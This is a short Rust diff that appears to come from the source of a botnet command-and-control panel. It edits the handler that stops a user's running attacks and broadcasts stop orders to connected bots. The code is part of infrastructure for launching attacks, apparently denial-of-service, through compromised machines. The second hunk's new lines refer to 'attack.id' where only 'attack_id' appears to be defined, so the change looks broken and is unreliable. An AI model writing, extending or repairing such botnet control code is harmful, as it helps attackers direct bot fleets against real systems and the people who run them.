@@ -218,8 +218,8 @@ pub async fn handle_stop_command(client: &Arc<Client>, state: &Arc<AppState>, pa
             let attacks = state.attack_manager.get_user_attacks(&client.user.username).await;
             let mut count = 0;
             for attack in attacks {
-                if state.attack_manager.stop_attack(attack.id).await.is_ok() {
-                    state.bot_manager.broadcast_stop(attack.id).await;
+                if state.attack_manager.stop_attack(attack.id as usize).await.is_ok() {
+                    state.bot_manager.broadcast_stop(attack.id as usize).await;
                     count += 1;
                 }
             }
@@ -237,8 +237,8 @@ pub async fn handle_stop_command(client: &Arc<Client>, state: &Arc<AppState>, pa
                  return Ok(());
             }
             
-            if state.attack_manager.stop_attack(attack_id).await.is_ok() {
-                state.bot_manager.broadcast_stop(attack_id).await;
+            if state.attack_manager.stop_attack(attack.id as usize).await.is_ok() {
+                state.bot_manager.broadcast_stop(attack.id as usize).await;
                 
                 client.write(format!("\x1b[38;5;82m[✓] Attack {} stopped\n\r", attack_id).as_bytes()).await?;
                 
